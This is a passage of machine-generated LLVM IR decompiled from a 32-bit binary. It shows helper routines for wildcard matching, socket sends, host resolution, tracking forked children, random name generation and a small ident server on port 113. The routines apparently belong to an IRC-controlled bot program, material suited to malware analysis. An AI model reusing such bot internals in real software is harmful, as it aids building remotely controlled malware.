dec_label_pc_80482b9:                             ; preds = %dec_label_pc_8048299, %dec_label_pc_8048279
  br label %dec_label_pc_80482c0

dec_label_pc_80482c0:                             ; preds = %dec_label_pc_8048290, %dec_label_pc_8048299, %dec_label_pc_80482b9
  %storemerge8 = phi i32 [ 0, %dec_label_pc_80482b9 ], [ 1, %dec_label_pc_8048299 ], [ 1, %dec_label_pc_8048290 ]
  br label %dec_label_pc_8048366

dec_label_pc_80482cb:                             ; preds = %dec_label_pc_8048254
  %v2_80482ce = load i8, i8* %tmp14, align 1
  %v4_80482d0 = icmp eq i8 %v2_80482ce, 0
  br i1 %v4_80482d0, label %dec_label_pc_80482fd, label %dec_label_pc_80482d4

dec_label_pc_80482d4:                             ; preds = %dec_label_pc_80482cb
  %v1_80482d7 = add i32 %arg2, 1
  %v1_80482db = add i32 %v4_804823f, 1
  %v5_80482e0 = inttoptr i32 %v1_80482db to i8*
  %v5_80482e1 = call i32 @strwildmatch(i8* %v5_80482e0, i32 %v1_80482d7)
  %v1_80482e9 = icmp ne i32 %v5_80482e1, 0
  %. = zext i1 %v1_80482e9 to i32
  br label %dec_label_pc_80482fd

dec_label_pc_80482fd:                             ; preds = %dec_label_pc_80482d4, %dec_label_pc_80482cb
  %storemerge5 = phi i32 [ 1, %dec_label_pc_80482cb ], [ %., %dec_label_pc_80482d4 ]
  br label %dec_label_pc_8048366

dec_label_pc_8048305:                             ; preds = %dec_label_pc_804825a
  %v2_8048308 = load i8, i8* %arg1, align 1
  %v3_8048308 = zext i8 %v2_8048308 to i32
  %v2_8048313 = call i32 @__GI_toupper(i32 %v3_8048308)
  store i32 %v2_8048313, i32* @ebx, align 4
  %v2_8048320 = load i8, i8* %tmp14, align 1
  %v3_8048320 = zext i8 %v2_8048320 to i32
  %v2_804832b = call i32 @__GI_toupper(i32 %v3_8048320)
  %v0_8048333 = load i32, i32* @ebx, align 4
  %v12_8048333 = icmp eq i32 %v0_8048333, %v2_804832b
  %v1_8048335 = icmp eq i1 %v12_8048333, false
  br i1 %v1_8048335, label %dec_label_pc_8048360, label %dec_label_pc_8048337

dec_label_pc_8048337:                             ; preds = %dec_label_pc_8048305
  %v1_804833a = add i32 %arg2, 1
  %v1_804833e = add i32 %v4_804823f, 1
  %v5_8048343 = inttoptr i32 %v1_804833e to i8*
  %v5_8048344 = call i32 @strwildmatch(i8* %v5_8048343, i32 %v1_804833a)
  %v1_804834c = icmp ne i32 %v5_8048344, 0
  %.9 = zext i1 %v1_804834c to i32
  br label %dec_label_pc_8048360

dec_label_pc_8048360:                             ; preds = %dec_label_pc_8048337, %dec_label_pc_8048305
  %storemerge = phi i32 [ 1, %dec_label_pc_8048305 ], [ %.9, %dec_label_pc_8048337 ]
  br label %dec_label_pc_8048366

dec_label_pc_8048366:                             ; preds = %dec_label_pc_80482fd, %dec_label_pc_80482c0, %dec_label_pc_8048265, %dec_label_pc_8048360
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_80482c0 ], [ %storemerge5, %dec_label_pc_80482fd ], [ %v3_8048268, %dec_label_pc_8048265 ], [ %storemerge, %dec_label_pc_8048360 ]
  %v3_8048369 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048369, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048242, { 2, 0, 1 }
  uselistorder i32 %v4_804823f, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048366, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80482c0, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v0_8048371 = load i32, i32* @edi, align 4
  %v4_8048378 = ptrtoint i32* %stack_var_12 to i32
  %v5_804838a = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_80543a0.253 to i32), i32 %arg2, i32 %v4_8048378)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_80543a0.253 to i32), i32* @edi, align 4
  %v3_80483a5 = call i32 @_strlen(i8* bitcast (i8** @global_var_80543a0.253 to i8*))
  %v6_80483b8 = call i32 @__libc_write(i32 %arg1, i32* bitcast (i8** @global_var_80543a0.253 to i32*), i32 %v3_80483a5)
  store i32 %v0_8048371, i32* @edi, align 4
  ret i32 %v6_80483b8
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80483d1 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_80483d1, i32* @global_var_80547a0.254, align 32
  %v10_80483e3 = icmp eq i32 %v1_80483d1, -1
  %v1_80483e6 = icmp eq i1 %v10_80483e3, false
  br i1 %v1_80483e6, label %dec_label_pc_804842c, label %dec_label_pc_80483e8

dec_label_pc_80483e8:                             ; preds = %entry
  %v1_80483ee = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 %v1_80483ee, i32* @eax, align 4
  %v4_80483f9 = icmp eq i32 %v1_80483ee, 0
  %v1_80483fd = icmp eq i1 %v4_80483f9, false
  br i1 %v1_80483fd, label %dec_label_pc_8048409, label %dec_label_pc_80483ff

dec_label_pc_80483ff:                             ; preds = %dec_label_pc_80483e8
  %v1_8048404 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483e8, %dec_label_pc_80483ff
  %v1_804840c = add i32 %v1_80483ee, 12
  %v2_804840c = inttoptr i32 %v1_804840c to i32*
  %v3_804840c = load i32, i32* %v2_804840c, align 4
  %v1_8048419 = add i32 %v1_80483ee, 16
  %v2_8048419 = inttoptr i32 %v1_8048419 to i32*
  %v3_8048419 = load i32, i32* %v2_8048419, align 4
  %v1_804841c = inttoptr i32 %v3_8048419 to i32*
  %v2_804841c = load i32, i32* %v1_804841c, align 4
  %v3_8048424 = call i32 @bcopy(i32 %v2_804841c, i32 ptrtoint (i32* @global_var_80547a0.254 to i32), i32 %v3_804840c)
  %v0_804842c.pre = load i32, i32* @global_var_80547a0.254, align 32
  br label %dec_label_pc_804842c

dec_label_pc_804842c:                             ; preds = %entry, %dec_label_pc_8048409
  %v0_804842c = phi i32 [ %v1_80483d1, %entry ], [ %v0_804842c.pre, %dec_label_pc_8048409 ]
  ret i32 %v0_804842c

; uselistorder directives
  uselistorder i32 %v1_80483d1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804842c, { 1, 0 }
  uselistorder label %dec_label_pc_8048409, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048439 = load i8, i8* @global_var_8054384.255, align 4
  %v10_804843e = icmp eq i8 %v0_8048439, 1
  %v1_8048440 = icmp eq i1 %v10_804843e, false
  br i1 %v1_8048440, label %dec_label_pc_804844e, label %dec_label_pc_80484f4

dec_label_pc_804844e:                             ; preds = %entry
  %v0_804844e = call i32 @__libc_fork()
  %v4_8048456 = icmp eq i32 %v0_804844e, 0
  %v1_804845a = icmp eq i1 %v4_8048456, false
  br i1 %v1_804845a, label %dec_label_pc_8048467, label %dec_label_pc_804845c

dec_label_pc_804845c:                             ; preds = %dec_label_pc_804844e
  br label %dec_label_pc_80484f4

dec_label_pc_8048467:                             ; preds = %dec_label_pc_804844e
  %v0_8048467 = load i32, i32* @global_var_8054390.256, align 16
  %v1_804846c = add i32 %v0_8048467, 1
  store i32 %v1_804846c, i32* @global_var_8054390.256, align 16
  %v2_8048477 = mul i32 %v1_804846c, 4
  %v1_804847a = add i32 %v2_8048477, 4
  %v1_8048481 = call i32 @malloc(i32 %v1_804847a)
  %v0_80484b79 = load i32, i32* @global_var_8054390.256, align 16
  %v6_80484c011 = icmp eq i32 %v0_80484b79, 1
  br i1 %v6_80484c011, label %dec_label_pc_80484c2, label %dec_label_pc_8048495

dec_label_pc_8048495:                             ; preds = %dec_label_pc_8048467, %dec_label_pc_8048495
  %storemerge12 = phi i32 [ %v4_80484b4, %dec_label_pc_8048495 ], [ 0, %dec_label_pc_8048467 ]
  %v2_8048498 = mul i32 %storemerge12, 4
  %v5_804849d = add i32 %v2_8048498, %v1_8048481
  store i32 %v5_804849d, i32* @ecx, align 4
  %v0_80484a8 = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_80484ad = add i32 %v0_80484a8, %v2_8048498
  %v1_80484b0 = inttoptr i32 %v2_80484ad to i32*
  %v2_80484b0 = load i32, i32* %v1_80484b0, align 4
  %v2_80484b2 = inttoptr i32 %v5_804849d to i32*
  store i32 %v2_80484b0, i32* %v2_80484b2, align 4
  %v4_80484b4 = add i32 %storemerge12, 1
  %v0_80484b7 = load i32, i32* @global_var_8054390.256, align 16
  %v1_80484bc = add i32 %v0_80484b7, -1
  %v6_80484c0 = icmp ugt i32 %v1_80484bc, %v4_80484b4
  br i1 %v6_80484c0, label %dec_label_pc_8048495, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_8048495, %dec_label_pc_8048467
  %v0_80484b7.lcssa = phi i32 [ %v0_80484b79, %dec_label_pc_8048467 ], [ %v0_80484b7, %dec_label_pc_8048495 ]
  %v2_80484c7 = mul i32 %v0_80484b7.lcssa, 4
  %v5_80484ca = add i32 %v1_8048481, -4
  %v1_80484cd = add i32 %v5_80484ca, %v2_80484c7
  store i32 %v1_80484cd, i32* @edx, align 4
  %v2_80484d3 = inttoptr i32 %v1_80484cd to i32*
  store i32 %v0_804844e, i32* %v2_80484d3, align 4
  %v0_80484d5 = load i32, i32* @global_var_8056a2c.257, align 4
  %v1_80484de = call i32 @free(i32 %v0_80484d5)
  store i32 %v1_8048481, i32* @global_var_8056a2c.257, align 4
  br label %dec_label_pc_80484f4

dec_label_pc_80484f4:                             ; preds = %entry, %dec_label_pc_804845c, %dec_label_pc_80484c2
  %stack_var_-24.0 = phi i32 [ %v0_804844e, %dec_label_pc_80484c2 ], [ %v0_804844e, %dec_label_pc_804845c ], [ 1, %entry ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80484b4, { 1, 0 }
  uselistorder i32 %v2_8048498, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v0_80484b79, { 1, 0 }
  uselistorder i32 %v1_8048481, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80484f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048495, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048521 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8048521

dec_label_pc_8048502:                             ; preds = %dec_label_pc_8048543, %dec_label_pc_8048521
  %v3_8048513 = call i32 @_strlen(i8* %arg1)
  %v6_804851a = add i32 %v4_8048521, %v3_8048513
  %v1_804851d = add i32 %v6_804851a, -1
  %v1_804851e = inttoptr i32 %v1_804851d to i8*
  store i8 0, i8* %v1_804851e, align 1
  br label %dec_label_pc_8048521

dec_label_pc_8048521:                             ; preds = %entry, %dec_label_pc_8048502
  %v3_8048532 = call i32 @_strlen(i8* %arg1)
  %v6_8048539 = add i32 %v4_8048521, %v3_8048532
  %v1_804853c = add i32 %v6_8048539, -1
  %v1_804853d = inttoptr i32 %v1_804853c to i8*
  %v2_804853d = load i8, i8* %v1_804853d, align 1
  %v10_804853f = icmp eq i8 %v2_804853d, 13
  br i1 %v10_804853f, label %dec_label_pc_8048502, label %dec_label_pc_8048543

dec_label_pc_8048543:                             ; preds = %dec_label_pc_8048521
  %v3_8048554 = call i32 @_strlen(i8* %arg1)
  %v6_804855b = add i32 %v4_8048521, %v3_8048554
  %v1_804855e = add i32 %v6_804855b, -1
  %v1_804855f = inttoptr i32 %v1_804855e to i8*
  %v2_804855f = load i8, i8* %v1_804855f, align 1
  %v11_8048561 = icmp eq i8 %v2_804855f, 10
  br i1 %v11_8048561, label %dec_label_pc_8048502, label %dec_label_pc_8048565

dec_label_pc_8048565:                             ; preds = %dec_label_pc_8048543
  %v1_804856a = sext i8 %v2_804855f to i32
  ret i32 %v1_804856a

; uselistorder directives
  uselistorder i32 %v4_8048521, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8048521, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-1064 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804856e = load i32, i32* @edi, align 4
  %v0_804856f = load i32, i32* @esi, align 4
  %v0_8048570 = load i32, i32* @ebx, align 4
  store i32 %v0_8048570, i32* %stack_var_-16, align 4
  %v1_8048577 = call i32 @random()
  %v2_8048587 = ashr i32 %v1_8048577, 31
  %v2_804858a = zext i32 %v1_8048577 to i64
  %v4_804858a = zext i32 %v2_8048587 to i64
  %v5_804858a = mul nuw i64 %v4_804858a, 4294967296
  %v6_804858a = or i64 %v5_804858a, %v2_804858a
  %v10_804858a = srem i64 %v6_804858a, 5
  %v11_804858a = trunc i64 %v10_804858a to i32
  %v1_804858e = add i32 %v11_804858a, 4
  %v1_8048597 = add i32 %v11_804858a, 5
  %v2_804859c = call i32 @malloc(i32 %v1_8048597)
  %tmp21 = bitcast i8** %stack_var_-40 to i32*
  store i32 %v2_804859c, i32* %tmp21, align 4
  %tmp22 = inttoptr i32 %v2_804859c to i8*
  store i32 %v2_804859c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_80485b5 = and i32 %v2_804859c, -256
  store i32 %v1_80485b5, i32* @eax, align 4
  %v5_80485b7 = call i8* @_memset(i8* %tmp22, i32 %v1_80485b5, i32 %v1_8048597)
  %v3_80485c6 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_8051112.259 to i32), i32 ptrtoint (i32* @global_var_8051110.258 to i32))
  store i32 %v3_80485c6, i32* @eax, align 4
  %v4_80485d1 = icmp eq i32 %v3_80485c6, 0
  %v1_80485d5 = icmp eq i1 %v4_80485d1, false
  br i1 %v1_80485d5, label %dec_label_pc_8048614, label %dec_label_pc_8048607.preheader

dec_label_pc_8048607.preheader:                   ; preds = %entry
  %v5_804860d31 = icmp sgt i32 %v1_804858e, 0
  br i1 %v5_804860d31, label %dec_label_pc_80485e0, label %dec_label_pc_80486cd

dec_label_pc_80485e0:                             ; preds = %dec_label_pc_80485e0, %dec_label_pc_8048607.preheader
  %v4_80485e5 = phi i8* [ %tmp22, %dec_label_pc_8048607.preheader ], [ %v3_80486cd.pre.pre, %dec_label_pc_80485e0 ]
  %storemerge32 = phi i32 [ 0, %dec_label_pc_8048607.preheader ], [ %v4_8048604, %dec_label_pc_80485e0 ]
  store i32 %storemerge32, i32* @eax, align 4
  %v5_80485e5 = ptrtoint i8* %v4_80485e5 to i32
  %v6_80485e5 = add i32 %v5_80485e5, %storemerge32
  store i32 %v6_80485e5, i32* @ebx, align 4
  %v0_80485e8 = call i32 @random()
  %v2_80485f8 = ashr i32 %v0_80485e8, 31
  %v2_80485fb = zext i32 %v0_80485e8 to i64
  %v4_80485fb = zext i32 %v2_80485f8 to i64
  %v5_80485fb = mul nuw i64 %v4_80485fb, 4294967296
  %v6_80485fb = or i64 %v5_80485fb, %v2_80485fb
  %v10_80485fb = srem i64 %v6_80485fb, 26
  %v11_80485fb = trunc i64 %v10_80485fb to i8
  %v1_80485ff = add i8 %v11_80485fb, 65
  %v2_8048602 = load i32, i32* @ebx, align 4
  %v3_8048602 = inttoptr i32 %v2_8048602 to i8*
  store i8 %v1_80485ff, i8* %v3_8048602, align 1
  %v4_8048604 = add nuw nsw i32 %storemerge32, 1
  %exitcond33 = icmp eq i32 %v4_8048604, %v1_804858e
  %v3_80486cd.pre.pre = load i8*, i8** %stack_var_-40, align 4
  br i1 %exitcond33, label %dec_label_pc_80486cd, label %dec_label_pc_80485e0

dec_label_pc_8048614:                             ; preds = %entry
  %v1_8048614 = call i32 @random()
  store i32 %v1_8048614, i32* @eax, align 4
  store i32 %v1_8048614, i32* @ebx, align 4
  %v0_804861b = call i32 @random()
  %v1_804861b = sext i32 %v0_804861b to i64
  %v0_8048620 = load i32, i32* @ebx, align 4
  %v3_8048622 = sext i32 %v0_8048620 to i64
  %v5_8048622 = mul nsw i64 %v3_8048622, %v1_804861b
  %v6_8048622 = trunc i64 %v5_8048622 to i32
  %v2_804862e = ashr i32 %v6_8048622, 31
  %v2_8048631 = and i64 %v5_8048622, 4294967295
  %v4_8048631 = zext i32 %v2_804862e to i64
  %v5_8048631 = mul nuw i64 %v4_8048631, 4294967296
  %v6_8048631 = or i64 %v5_8048631, %v2_8048631
  %v10_8048631 = srem i64 %v6_8048631, 45402
  %v11_8048631 = trunc i64 %v10_8048631 to i32
  store i32 %v11_8048631, i32* @edx, align 4
  %v1_8048635 = add i32 %v11_8048631, 1
  %v2_804864d = ptrtoint i32* %stack_var_-1064 to i32
  %tmp23 = bitcast i32* %stack_var_-1064 to i8*
  %v5_804866527 = icmp sgt i32 %v1_8048635, 0
  br i1 %v5_804866527, label %dec_label_pc_8048642, label %dec_label_pc_8048667

dec_label_pc_8048642:                             ; preds = %dec_label_pc_8048614, %dec_label_pc_8048642
  %storemerge428 = phi i32 [ %v4_804865c, %dec_label_pc_8048642 ], [ 0, %dec_label_pc_8048614 ]
  %v4_8048654 = call i32 @fgets(i32 %v2_804864d, i32 1024, i32 %v3_80485c6)
  %v4_804865c = add nuw nsw i32 %storemerge428, 1
  %exitcond = icmp eq i32 %v4_804865c, %v1_8048635
  br i1 %exitcond, label %dec_label_pc_8048667, label %dec_label_pc_8048642

dec_label_pc_8048667:                             ; preds = %dec_label_pc_8048614, %dec_label_pc_8048642
  store i32 %v2_804864d, i32* @edx, align 4
  %v5_804867b = call i32 @__GI_memset(i8* %tmp23, i32 0, i32 1024)
  %v4_8048695 = call i32 @fgets(i32 %v2_804864d, i32 1024, i32 %v3_80485c6)
  %v2_80486a4 = call i32 @filter(i8* %tmp23)
  store i32 %v2_804859c, i32* @eax, align 4
  store i32 %v2_804859c, i32* @edi, align 4
  store i32 %v2_804864d, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_80486bd = call i8* @_memcpy(i8* %tmp22, i8* %tmp23, i32 %v1_804858e)
  %v8_80486bd = ptrtoint i8* %v7_80486bd to i32
  store i32 %v8_80486bd, i32* @ecx, align 4
  %tmp24 = inttoptr i32 %v3_80485c6 to i16*
  %v3_80486c5 = call i32 @__GI_fclose(i16* %tmp24)
  br label %dec_label_pc_80486cd

dec_label_pc_80486cd:                             ; preds = %dec_label_pc_80485e0, %dec_label_pc_8048607.preheader, %dec_label_pc_8048667
  %v3_80486cd = phi i8* [ %tmp22, %dec_label_pc_8048667 ], [ %tmp22, %dec_label_pc_8048607.preheader ], [ %v3_80486cd.pre.pre, %dec_label_pc_80485e0 ]
  %v4_80486cd = ptrtoint i8* %v3_80486cd to i32
  %v2_80486d3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80486d3, i32* @ebx, align 4
  store i32 %v0_804856f, i32* @esi, align 4
  store i32 %v0_804856e, i32* @edi, align 4
  ret i32 %v4_80486cd

; uselistorder directives
  uselistorder i32 %v4_804865c, { 1, 0 }
  uselistorder i8* %tmp23, { 2, 1, 0 }
  uselistorder i32 %v2_804864d, { 2, 1, 0, 3 }
  uselistorder i32 %v4_8048604, { 1, 0 }
  uselistorder i32 %storemerge32, { 1, 2, 0 }
  uselistorder i32 %v3_80485c6, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp22, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_8048597, { 1, 0 }
  uselistorder i32 %v1_804858e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80486cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048667, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_80486eb = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_80486f6 = icmp eq i32 %v3_80486eb, -1
  br i1 %v13_80486f6, label %dec_label_pc_8048915, label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  %v1_804870b = call i32 @htons(i32 113)
  %v2_804871e = ptrtoint i32* %stack_var_-52 to i32
  %v3_804873d = call i32 @bind(i32 %v3_80486eb, i32 %v2_804871e, i32 16)
  %v10_8048745 = icmp eq i32 %v3_804873d, -1
  br i1 %v10_8048745, label %dec_label_pc_8048915, label %dec_label_pc_804874e

dec_label_pc_804874e:                             ; preds = %dec_label_pc_8048700
  %v2_8048756 = call i32 @listen(i32 %v3_80486eb, i32 1)
  %v10_804875e = icmp eq i32 %v2_8048756, -1
  br i1 %v10_804875e, label %dec_label_pc_8048915, label %dec_label_pc_8048767

dec_label_pc_8048767:                             ; preds = %dec_label_pc_804874e
  %v0_8048767 = call i32 @__libc_fork()
  %v1_804876c = icmp eq i32 %v0_8048767, 0
  br i1 %v1_804876c, label %dec_label_pc_8048915, label %dec_label_pc_8048774

dec_label_pc_8048774:                             ; preds = %dec_label_pc_8048767
  store i32 16, i32* %stack_var_-36, align 4
  %v2_804877b = ptrtoint i32* %stack_var_-36 to i32
  %v2_804877e = ptrtoint i32* %stack_var_-68 to i32
  %v3_8048789 = call i32 @__libc_accept(i32 %v3_80486eb, i32 %v2_804877e, i32 %v2_804877b)
  store i32 %v3_8048789, i32* @eax, align 4
  %v4_8048794 = add i32 %v3_8048789, 1
  %v13_8048794 = icmp eq i32 %v4_8048794, 0
  %v1_8048798 = icmp eq i1 %v13_8048794, false
  br i1 %v1_8048798, label %dec_label_pc_80487a4.preheader, label %dec_label_pc_804879a

dec_label_pc_804879a:                             ; preds = %dec_label_pc_8048774
  %v1_804879f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80487a4.preheader

dec_label_pc_80487a4.preheader:                   ; preds = %dec_label_pc_804879a, %dec_label_pc_8048774
  %v2_80487ae = ptrtoint i32* %stack_var_-1228 to i32
  %tmp31 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80487c2 = udiv i32 %v3_8048789, 32
  %v1_80487c8 = urem i32 %v3_8048789, 32
  %v9_80487cb = shl i32 1, %v1_80487c8
  %v2_80487f0 = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048827 = mul nuw nsw i32 %v2_80487c2, 4
  %v3_8048827 = add nsw i32 %v2_8048827, -1224
  br label %dec_label_pc_80487a4

dec_label_pc_80487a4:                             ; preds = %dec_label_pc_80487a4.preheader, %dec_label_pc_8048819
  store i32 %v2_80487ae, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80487b5 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v0_80487cb = load i32, i32* @ebp, align 4
  %v4_80487cb = add i32 %v3_8048827, %v0_80487cb
  %v5_80487cb = inttoptr i32 %v4_80487cb to i32*
  %v6_80487cb = load i32, i32* %v5_80487cb, align 4
  %v12_80487cb = or i32 %v6_80487cb, %v9_80487cb
  store i32 %v12_80487cb, i32* %v5_80487cb, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_8048803 = call i32 @__libc_select(i32 %v4_8048794, i32 %v2_80487ae, i32 0, i32 0, i32 %v2_80487f0)
  store i32 %v6_8048803, i32* @eax, align 4
  %v2_804880b = icmp slt i32 %v6_8048803, 0
  %v1_804880d = icmp eq i1 %v2_804880b, false
  br i1 %v1_804880d, label %dec_label_pc_8048819, label %dec_label_pc_804880f

dec_label_pc_804880f:                             ; preds = %dec_label_pc_80487a4
  %v1_8048814 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048819

dec_label_pc_8048819:                             ; preds = %dec_label_pc_80487a4, %dec_label_pc_804880f
  %v0_8048827 = load i32, i32* @ebp, align 4
  %v4_8048827 = add i32 %v3_8048827, %v0_8048827
  %v5_8048827 = inttoptr i32 %v4_8048827 to i32*
  %v6_8048827 = load i32, i32* %v5_8048827, align 4
  %v10_8048827 = and i32 %v6_8048827, %v9_80487cb
  %v11_8048827 = icmp ne i32 %v10_8048827, 0
  %v4_8048832 = icmp eq i1 %v11_8048827, false
  %v1_8048834 = icmp eq i1 %v4_8048832, false
  br i1 %v1_8048834, label %dec_label_pc_804883b, label %dec_label_pc_80487a4

dec_label_pc_804883b:                             ; preds = %dec_label_pc_8048819
  %v2_8048842 = ptrtoint i32* %stack_var_-1092 to i32
  %v5_804884c = call i32 @__libc_recv(i32 %v3_8048789, i32 %v2_8048842, i32 1024, i32 0)
  store i32 %v5_804884c, i32* @eax, align 4
  %tmp32 = icmp slt i32 %v5_804884c, 1
  br i1 %tmp32, label %dec_label_pc_8048863, label %dec_label_pc_804885d

dec_label_pc_804885d:                             ; preds = %dec_label_pc_804883b
  %v7_8048861 = icmp sgt i32 %v5_804884c, 19
  br i1 %v7_8048861, label %dec_label_pc_8048863, label %dec_label_pc_804886d

dec_label_pc_8048863:                             ; preds = %dec_label_pc_804885d, %dec_label_pc_804883b
  %v1_8048868 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804886d

dec_label_pc_804886d:                             ; preds = %dec_label_pc_804885d, %dec_label_pc_8048863
  %v0_8048870 = load i32, i32* @ebp, align 4
  %v2_8048870 = add i32 %v5_804884c, -1088
  %v3_8048870 = add i32 %v2_8048870, %v0_8048870
  %v4_8048870 = inttoptr i32 %v3_8048870 to i8*
  store i8 0, i8* %v4_8048870, align 1
  %v0_804887c = load i32, i32* @ebp, align 4
  %v2_804887c = add i32 %v5_804884c, -1089
  %v3_804887c = add i32 %v2_804887c, %v0_804887c
  %v4_804887c = inttoptr i32 %v3_804887c to i8*
  %v5_804887c = load i8, i8* %v4_804887c, align 1
  %v10_8048883 = icmp eq i8 %v5_804887c, 10
  br i1 %v10_8048883, label %dec_label_pc_8048896, label %dec_label_pc_8048887

dec_label_pc_8048887:                             ; preds = %dec_label_pc_804886d
  %v5_804888b = load i8, i8* %v4_804887c, align 1
  %v10_8048892 = icmp eq i8 %v5_804888b, 13
  %v1_8048894 = icmp eq i1 %v10_8048892, false
  br i1 %v1_8048894, label %dec_label_pc_80488a2, label %dec_label_pc_8048896

dec_label_pc_8048896:                             ; preds = %dec_label_pc_8048887, %dec_label_pc_804886d
  store i8 0, i8* %v4_804887c, align 1
  %v0_80488a8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80488a2

dec_label_pc_80488a2:                             ; preds = %dec_label_pc_8048887, %dec_label_pc_8048896
  %v0_80488ca = phi i32 [ %v0_804887c, %dec_label_pc_8048887 ], [ %v0_80488a8.pre, %dec_label_pc_8048896 ]
  %v2_80488a8 = add i32 %v5_804884c, -1090
  %v3_80488a8 = add i32 %v2_80488a8, %v0_80488ca
  %v4_80488a8 = inttoptr i32 %v3_80488a8 to i8*
  %v5_80488a8 = load i8, i8* %v4_80488a8, align 1
  %v10_80488af = icmp eq i8 %v5_80488a8, 10
  br i1 %v10_80488af, label %dec_label_pc_80488c4, label %dec_label_pc_80488b3

dec_label_pc_80488b3:                             ; preds = %dec_label_pc_80488a2
  %v5_80488b9 = load i8, i8* %v4_80488a8, align 1
  %v10_80488c0 = icmp eq i8 %v5_80488b9, 13
  %v1_80488c2 = icmp eq i1 %v10_80488c0, false
  br i1 %v1_80488c2, label %dec_label_pc_80488d2, label %dec_label_pc_80488c4

dec_label_pc_80488c4:                             ; preds = %dec_label_pc_80488b3, %dec_label_pc_80488a2
  store i8 0, i8* %v4_80488a8, align 1
  br label %dec_label_pc_80488d2

dec_label_pc_80488d2:                             ; preds = %dec_label_pc_80488b3, %dec_label_pc_80488c4
  %v4_80488e7 = call i32 @Send(i32 %v3_8048789, i32 ptrtoint ([25 x i8]* @global_var_8051122.261 to i32), i32 %v2_8048842)
  %v1_80488f5 = call i32 @__libc_close(i32 %v3_8048789)
  %v1_8048903 = call i32 @__libc_close(i32 %v3_80486eb)
  store i32 %v1_8048903, i32* @eax, align 4
  %v1_8048910 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048915

dec_label_pc_8048915:                             ; preds = %dec_label_pc_8048767, %dec_label_pc_804874e, %dec_label_pc_8048700, %entry, %dec_label_pc_80488d2
  %v0_8048919 = phi i32 [ 0, %dec_label_pc_8048767 ], [ -1, %dec_label_pc_804874e ], [ -1, %dec_label_pc_8048700 ], [ -1, %entry ], [ %v1_8048910, %dec_label_pc_80488d2 ]
  ret i32 %v0_8048919

; uselistorder directives
  uselistorder i32 %v5_804884c, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_8048842, { 1, 0 }
  uselistorder i32 %v3_8048827, { 1, 0 }
  uselistorder i32 %v3_8048789, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 %v3_80486eb, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_8048915, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80488d2, { 1, 0 }
  uselistorder label %dec_label_pc_80488a2, { 1, 0 }
  uselistorder label %dec_label_pc_804886d, { 1, 0 }
